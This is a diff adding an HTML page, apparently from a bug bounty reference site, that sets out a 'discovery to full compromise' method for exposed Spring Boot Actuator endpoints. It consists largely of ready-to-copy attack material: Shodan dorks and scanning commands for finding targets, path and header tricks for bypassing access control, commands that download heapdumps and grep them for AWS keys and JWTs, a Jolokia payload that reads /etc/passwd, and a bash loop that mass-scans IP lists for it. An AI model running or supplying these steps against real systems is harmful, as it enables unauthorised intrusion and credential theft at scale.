@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Spring Boot - Bug Bounty Hub</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+    <nav class="navbar">
+        <div class="nav-container">
+            <a href="index.html" class="nav-logo">
+                <img src="logo/logo.png" alt="BugBounty Hub">
+            </a>
+            <button class="nav-toggle" id="navToggle">
+                <i class="fas fa-bars"></i>
+            </button>
+            <ul class="nav-menu" id="navMenu">
+                <li><a href="index.html" class="nav-link">Home</a></li>
+                <li class="dropdown">
+                    <a href="#" class="nav-link active">Vulnerabilities <i class="fas fa-chevron-down"></i></a>
+                    <ul class="dropdown-menu">
+                        <li><a href="manual-open-redirect.html"><i class="fas fa-external-link-alt"></i> Manual Open Redirect</a></li>
+                        <li><a href="open-redirect.html"><i class="fas fa-robot"></i> Automated Open Redirect</a></li>
+                        <li><a href="xss.html"><i class="fas fa-bug"></i> XSS</a></li>
+                        <li><a href="blind-xss.html"><i class="fas fa-eye-slash"></i> Blind XSS</a></li>
+                        <li><a href="sqli.html"><i class="fas fa-database"></i> SQL Injection</a></li>
+                        <li><a href="idor.html"><i class="fas fa-id-card"></i> IDOR</a></li>
+                        <li><a href="lfi.html"><i class="fas fa-folder-open"></i> LFI</a></li>
+                        <li><a href="cmdi.html"><i class="fas fa-terminal"></i> Command Injection</a></li>
+                        <li><a href="subdomain-takeover.html"><i class="fas fa-globe"></i> Subdomain Takeover</a></li>
+                        <li><a href="cors.html"><i class="fas fa-exchange-alt"></i> CORS</a></li>
+                        <li><a href="csp-guide.html"><i class="fas fa-shield-alt"></i> CSP Guide</a></li>
+                        <li><a href="xxe.html"><i class="fas fa-file-code"></i> XXE</a></li>
+                        <li><a href="ssti.html"><i class="fas fa-file-alt"></i> SSTI</a></li>
+                        <li><a href="crlf.html"><i class="fas fa-code"></i> CRLF Injection</a></li>
+                        <li><a href="ssrf-payloads.html"><i class="fas fa-server"></i> SSRF Payloads</a></li>
+                        <li><a href="race-conditions.html"><i class="fas fa-stopwatch"></i> Race Conditions</a></li>
+                        <li><a href="poisoning.html"><i class="fas fa-bolt"></i> Cache Poisoning</a></li>
+                        <li><a href="information-disclosure.html"><i class="fas fa-eye"></i> Info Disclosure</a></li>
+                        <li><a href="host-header-injection.html"><i class="fas fa-globe-americas"></i> Host Header</a></li>
+                        <li><a href="header-injection.html"><i class="fas fa-heading"></i> Header Injection</a></li>
+                        <li><a href="html-injection.html"><i class="fas fa-code"></i> HTML Injection</a></li>
+                        <li><a href="directory-traversal.html"><i class="fas fa-folder"></i> Directory Traversal</a></li>
+                        <li><a href="wordpress.html"><i class="fab fa-wordpress"></i> WordPress</a></li>
+                        <li><a href="spring-boot.html"><i class="fas fa-leaf"></i> Spring Boot</a></li>
+                    </ul>
+                </li>
+                <li class="dropdown">
+                    <a href="#" class="nav-link">Tools <i class="fas fa-chevron-down"></i></a>
+                    <ul class="dropdown-menu">
+                        <li><a href="useful-tools.html"><i class="fas fa-toolbox"></i> Recon Tools</a></li>
+                        <li><a href="nuclei.html"><i class="fas fa-rocket"></i> Nuclei</a></li>
+                    </ul>
+                </li>
+                <li><a href="about.html" class="nav-link">About</a></li>
+            </ul>
+        </div>
+    </nav>
+
+    <header class="page-header">
+        <div class="breadcrumb">
+            <a href="index.html">Home</a>
+            <i class="fas fa-chevron-right"></i>
+            <span>Spring Boot</span>
+        </div>
+        <h1><i class="fas fa-leaf"></i> Spring Boot Actuator Exploitation</h1>
+        <p>From discovery to full compromise - practical methodology for exposed Spring Boot Actuator endpoints.</p>
+    </header>
+
+    <section class="content-section">
+        <div class="container">
+            <div class="content-card">
+                <h2><i class="fas fa-search"></i> Phase 1: Discovery</h2>
+                <h3>Goal</h3>
+                <p>Identify internet-exposed Spring Boot applications and verify whether Actuator endpoints are accessible.</p>
+
+                <h3>Method 1: Internet-Wide Recon Using Shodan</h3>
+                <p>Spring Boot applications commonly use a default favicon, making them fingerprintable at scale.</p>
+
+                <h4>Shodan Dorks</h4>
+                <div class="code-block">
+                    <button class="copy-btn">Copy</button>
+                    <pre>org:target_org http.favicon.hash:116323821
+ssl:"example.com" http.favicon.hash:116323821
+hostname:"example.com" http.favicon.hash:116323821
+ssl.cert.subject.CN:"*.example.com" http.favicon.hash:116323821
+ssl.cert.subject.CN:"example.com" http.favicon.hash:116323821</pre>
+                </div>
+
+                <h3>Method 2: Active Verification with Nuclei</h3>
+                <div class="code-block">
+                    <button class="copy-btn">Copy</button>
+                    <pre>cat act.txt | nuclei -tags actuator -c 50
+cat act.txt | nuclei -tags jolokia -es info,low -silent</pre>
+                </div>
+
+                <h3>Method 3: Directory Discovery with Dirsearch</h3>
+                <div class="code-block">
+                    <button class="copy-btn">Copy</button>
+                    <pre>dirsearch -l target.txt \
+-w /SecLists/Discovery/Web-Content/spring-boot.txt \
+-x 404 -o output.txt</pre>
+                </div>
+
+                <h3>Method 4: Fast Endpoint Probing with httpx</h3>
+                <div class="code-block">
+                    <button class="copy-btn">Copy</button>
+                    <pre>cat targets.txt | httpx-toolkit -silent -threads 50 \
+-path '/actuator,/actuator/health,/actuator/info' \
+-mc 200,401,403,302 > actuators.txt</pre>
+                </div>
+            </div>
+
+            <div class="content-card">
+                <h2><i class="fas fa-unlock"></i> Phase 2: Enumeration & Bypass</h2>
+                <h3>High-Value Actuator Endpoints</h3>
+                <ul>
+                    <li><code>/actuator/env</code></li>
+                    <li><code>/actuator/heapdump</code></li>
+                    <li><code>/actuator/jolokia</code></li>
+                    <li><code>/actuator/metrics</code></li>
+                    <li><code>/actuator/loggers</code></li>
+                    <li><code>/actuator/mappings</code></li>
+                    <li><code>/actuator/configprops</code></li>
+                    <li><code>/actuator/beans</code></li>
+                    <li><code>/actuator/threaddump</code></li>
+                </ul>
+
+                <h3>Header-Based Bypass</h3>
+                <div class="code-block">
+                    <button class="copy-btn">Copy</button>
+                    <pre>GET /actuator/env HTTP/1.1
+Host: example.com
+X-Forwarded-For: 127.0.0.1</pre>
+                </div>
+
+                <h3>Path Confusion Tricks</h3>
+                <ul>
+                    <li><code>/actuator;/env</code></li>
+                    <li><code>/actuator//env</code></li>
+                    <li><code>/actuator/.</code></li>
+                    <li><code>/./actuator</code></li>
+                    <li><code>/../actuator</code></li>
+                </ul>
+
+                <h3>Encoding Tricks</h3>
+                <ul>
+                    <li><code>/actuator%2Fenv</code></li>
+                    <li><code>/%2e%2e/actuator</code></li>
+                    <li><code>/actuator.json</code></li>
+                    <li><code>/actuator.html</code></li>
+                    <li><code>/actuator%00</code></li>
+                </ul>
+            </div>
+
+            <div class="content-card">
+                <h2><i class="fas fa-bolt"></i> Phase 3: Exploitation</h2>
+                <h3>Heapdump Analysis - Download</h3>
+                <div class="code-block">
+                    <button class="copy-btn">Copy</button>
+                    <pre>wget http://target.com/actuator/heapdump</pre>
+                </div>
+
+                <h3>Extract AWS Access Keys</h3>
+                <div class="code-block">
+                    <button class="copy-btn">Copy</button>
+                    <pre>strings -a -n 6 heapdump | grep -Eo 'AKIA[0-9A-Z]{16}' | sort -u</pre>
+                </div>
+
+                <h3>Extract JWT Tokens</h3>
+                <div class="code-block">
+                    <button class="copy-btn">Copy</button>
+                    <pre>strings -a -n 10 heapdump | \
+grep -Eo '[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+' | sort -u</pre>
+                </div>
+
+                <h3>Jolokia LFI via DiagnosticCommand</h3>
+                <div class="code-block">
+                    <button class="copy-btn">Copy</button>
+                    <pre>http://target.com/actuator/jolokia/exec/
+com.sun.management:type=DiagnosticCommand/
+compilerDirectivesAdd/!/etc!/passwd</pre>
+                </div>
+
+                <h3>Mass LFI Detection Script</h3>
+                <div class="code-block">
+                    <button class="copy-btn">Copy</button>
+                    <pre>#!/bin/bash
+while read ip; do
+  echo "Testing $ip"
+  curl -s "http://$ip/actuator/jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/etc!/passwd" \
+  | grep -q "root:" && echo "VULNERABLE: $ip"
+done < ip_list.txt</pre>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <footer class="footer">
+        <div class="container">
+            <p>&copy; 2026 Bug Bounty Hub. Open source security reference.</p>
+            <p>Made with <i class="fas fa-heart"></i> for the security community</p>
+        </div>
+    </footer>
+
+    <div id="toast" class="toast">Copied to clipboard!</div>
+    <script src="script.js"></script>
+</body>
+</html>
